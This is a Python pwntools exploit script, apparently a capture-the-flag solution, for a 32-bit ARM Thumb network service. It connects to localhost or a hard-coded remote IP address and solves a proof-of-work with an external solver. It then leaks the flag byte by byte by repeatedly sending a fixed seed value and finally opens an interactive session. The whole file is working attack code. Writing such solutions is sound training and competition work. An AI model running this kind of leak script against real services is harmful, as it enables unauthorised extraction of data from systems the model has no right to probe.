#!/usr/bin/python3

from pwn import *
import subprocess
import sys
import time

context.arch = 'thumb'
context.bits = 32
context.endian = 'little'

rem = False
host = "localhost"
port = 1338

if len(sys.argv) > 1:
	if sys.argv[1] == "rem":
		host = "91.98.131.46"
		rem = True

r = remote(host, port)

def pow_solve():
	r.recvuntil(b'unhex("')

	num = r.recvline().split(b'"')[0]

	print(f"[*] Retrieved num: {num}")

	result = subprocess.run(
	    ["./pow-solver", "30", num.decode()], 
	    capture_output=True, 
	    text=True
	)

	if result.returncode == 0:
	    pow_result = result.stdout.strip()
	    print(f"Result: {pow_result}")
	else:
	    print(f"Error: {result.stderr}")
	    sys.exit(1)

	print(f"[+] Sending {pow_result.encode()}")
	r.sendline(pow_result.encode())

if rem:
	pow_solve()


seed = 0x7ffde650
r.recvuntil(b'possible')
r.sendline(b'AAAA')

flag = b""
with log.progress('Flag') as prog:
	for i in range(30):
		prog.status(flag.decode())
		r.recvuntil(b'possible')
		r.sendline(p32(seed))
		r.recvuntil(b'answered')
		b = p8(int(r.recvline().rstrip(b'\n').rstrip(b'.').decode(), 16))
		if b != b'\x00':
			flag += b 

print(b"[*] Retrieved: ")


r.interactive()